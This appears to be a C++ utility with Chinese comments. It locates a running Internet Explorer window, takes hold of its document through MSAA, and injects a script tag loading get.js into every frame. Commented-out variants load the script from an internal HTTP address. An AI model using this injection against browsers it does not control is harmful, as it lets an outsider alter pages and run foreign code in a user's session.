
#include <iostream>
#include <windows.h>
#include <mshtml.h>
#include <oleacc.h>
#include <atlbase.h>
#include <atlbase.h> //需要安装ATL库 
/****************************************************************************
寻找指定类名的子窗口句柄
****************************************************************************/
HWND FindWithClassName(HWND ParentWnd,TCHAR* FindClassName)
{
 HWND hChild = ::GetWindow(ParentWnd, GW_CHILD);
 for(; hChild!=NULL ; hChild=::GetWindow(hChild,GW_HWNDNEXT))
 {
  TCHAR ClassName[100]={0};
  ::GetClassName(hChild,ClassName,sizeof(ClassName)/sizeof(TCHAR));
  if (_tcscmp(ClassName,FindClassName)==0)
   return hChild;
 
  HWND FindWnd=FindWithClassName(hChild,FindClassName);
  if (FindWnd)
   return FindWnd;
 }
 return NULL;
}

 
void Frame(CComPtr<IHTMLDocument2> doc)
{
 CComPtr<IHTMLDocument2> pDoc=doc;
 CComPtr<IHTMLWindow2> pHTMLWnd = NULL;
 CComPtr<IHTMLDocument2> pFrameDoc=NULL;
 CComPtr<IHTMLFramesCollection2> pFramesCollection=NULL;
 LPDISPATCH lpDispatch;
 long p;
 VARIANT varindex,varresult;
 varresult.vt=VT_DISPATCH;
 varindex.vt = VT_I4;
 if(pDoc!=NULL)
 {
  HRESULT hr=pDoc->get_frames(&pFramesCollection);
  if(SUCCEEDED(hr)&&pFramesCollection!=NULL)
  {
   hr=pFramesCollection->get_length(&p);
   if(SUCCEEDED(hr))
    for(int i=0; i<p; i++)
    {
     varindex.lVal = i;
     if(pFramesCollection->item(&varindex, &varresult) ==S_OK)
     {
      lpDispatch=(LPDISPATCH)varresult.ppdispVal;
      if (SUCCEEDED(lpDispatch->QueryInterface(IID_IHTMLWindow2, (LPVOID *)&pHTMLWnd)))
      {
       if(SUCCEEDED(pHTMLWnd->get_document( &pFrameDoc)))
       {
        CComPtr<IHTMLElement> e;
        HRESULT hrs=pFrameDoc->get_body(&e);
        CComBSTR strHTML("<br><script defer src=\"C:\\\\get.js\"></script>");
        CComBSTR strPos("AfterBegin");
        e->insertAdjacentHTML(strPos,strHTML);
       }
       
       pHTMLWnd=NULL;
      }
     }
    }
    
  }
  
 }
}
/****************************************************************************
从一个窗口句柄获取IHTMLDocument2接口
使用完后要调用Release
如果找不到接口，返回NULL
原理：
如果你的系统安装了Microsoft 活动辅助功能（MSAA），则您可以向浏览器窗口
（类名"Internet Explorer_Server"）发送WM_HTML_GETOBJECT消息，将消息返回的结果
作为一个参数传递给MSAA函数ObjectFromLresult，从而获取IHTMLDocument2 接口。

****************************************************************************/  

void GetIHTMLDocument2Interface(HWND BrowserWnd)
{
 CoInitialize(NULL);
 HRESULT hr;
 // Explicitly load MSAA so we know if it's installed
 HINSTANCE hInst = ::LoadLibrary( _T("OLEACC.DLL") );
 if ( hInst )
 {
  LRESULT lRes; //SendMessageTimeout后的返回值，用于函数pfObjectFromLresult的第1个参数
  UINT nMsg = ::RegisterWindowMessage( _T("WM_HTML_GETOBJECT") );
  ::SendMessageTimeout( BrowserWnd, nMsg, 0L, 0L, SMTO_ABORTIFHUNG, 1000, (DWORD*)&lRes );
  //获取函数pfObjectFromLresult
  LPFNOBJECTFROMLRESULT pfObjectFromLresult = (LPFNOBJECTFROMLRESULT)::GetProcAddress( hInst, "ObjectFromLresult");
  if ( pfObjectFromLresult  )
  {
   CComPtr<IHTMLDocument2> spDoc;
   hr = (*pfObjectFromLresult)( lRes, IID_IHTMLDocument, 0, (void**)&spDoc );
   if ( SUCCEEDED(hr) )
   {
    //获取文档接口
    CComPtr<IDispatch> spDisp;
    spDoc->get_Script( &spDisp );
    CComQIPtr<IHTMLWindow2> spWin=spDisp;
    spWin->get_document( &spDoc.p );
    
    Frame(spDoc);
  //  CComPtr<IHTMLElement> e;
  //  HRESULT hrs=spDoc->get_body(&e);
 
  //  CComBSTR strPos("AfterBegin");
  ////  CComBSTR strHTML("<br><script defer type=\"text/javascript\" src=\"http://172.16.172.95:8080/get.js\"></script>");
  //   
  ////        CComBSTR strHTML("<br><script defer type=\"text/javascript\" src=\"../js/common/get.js\"></script>");
  ////   CComBSTR strHTML("<br><script defer>alert('Hello World');</script>");
  //       CComBSTR strHTML("<br><script defer src=\"C:\\\\get.js\"></script>");
  //  e->insertAdjacentHTML(strPos,strHTML);
    
   } // else document not ready
  } // else Internet Explorer is not running
  ::FreeLibrary( hInst );
 } // else Active Accessibility is not installed
 CoUninitialize();
}

int main()
{
 
 HWND ExplorerWnd=::FindWindow(_T("IEFrame"),NULL);
 HWND BrowserWnd=FindWithClassName( ExplorerWnd , _T("Internet Explorer_Server"));
 GetIHTMLDocument2Interface(BrowserWnd);
}
